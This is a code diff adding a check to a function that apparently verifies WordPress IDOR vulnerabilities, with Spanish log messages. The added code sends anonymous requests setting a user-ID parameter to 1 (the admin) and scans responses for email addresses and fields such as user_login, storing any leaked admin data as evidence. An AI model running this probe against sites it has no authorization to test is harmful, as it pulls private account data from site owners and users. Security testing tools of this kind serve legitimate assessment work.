@@ -12960,6 +12960,44 @@ def verify_wordpress_idor(
         except Exception:
             pass
 
+        # 6. User metadata IDOR: also try with admin user ID (common WP IDOR variant)
+        # Many WP plugins expose user data via endpoints that accept user_id — even when
+        # the primary test is post-based, test user_id=1 (admin) as extra evidence
+        _user_id_p = id_param_hint if (id_param_hint and "user" in id_param_hint.lower()) else None
+        if not _user_id_p:
+            for _p in params_base:
+                if any(h in _p.lower() for h in ("user_id", "userid", "uid", "author_id")):
+                    _user_id_p = _p
+                    break
+        if _user_id_p and not _idor_succeeded:
+            step(f"idor: probando user IDOR con {_user_id_p}=1 (admin user) como anonimo...")
+            try:
+                _user_params = {**params_base, _user_id_p: "1"}
+                _user_r = anon_sess.request(
+                    m, boot.base_url + endpoint,
+                    json=_user_params if (m not in ("GET", "HEAD") and json_body) else None,
+                    data=_user_params if (m not in ("GET", "HEAD") and not json_body) else None,
+                    params=_user_params if m == "GET" else None,
+                    timeout=15, allow_redirects=True)
+                _user_body = (_user_r.text or "")[:500]
+                _has_email = bool(re.search(r"\b[a-zA-Z0-9._%+\-]+@[a-zA-Z0-9.\-]+\.[a-zA-Z]{2,}\b", _user_body))
+                _has_user_data = (_user_r.status_code == 200 and len(_user_body) > 20 and
+                                  any(kw in _user_body.lower() for kw in
+                                      ("user_login", "user_email", "admin", "display_name")))
+                if _has_email or _has_user_data:
+                    res.evidence["user_idor"] = {
+                        "param": _user_id_p, "user_id": 1,
+                        "status": _user_r.status_code, "has_email": _has_email,
+                        "body_snippet": _user_body[:200],
+                    }
+                    if _anon_direct_blocked:
+                        _idor_succeeded = True
+                        _secret_found = True
+                        res.evidence["idor_body_snippet"] = _user_body[:300]
+                        step("idor: USER IDOR confirmado — datos del admin expuestos via endpoint")
+            except Exception:
+                pass
+
         if _idor_succeeded and _anon_direct_blocked:
             res.verified = True
             res.ok = True
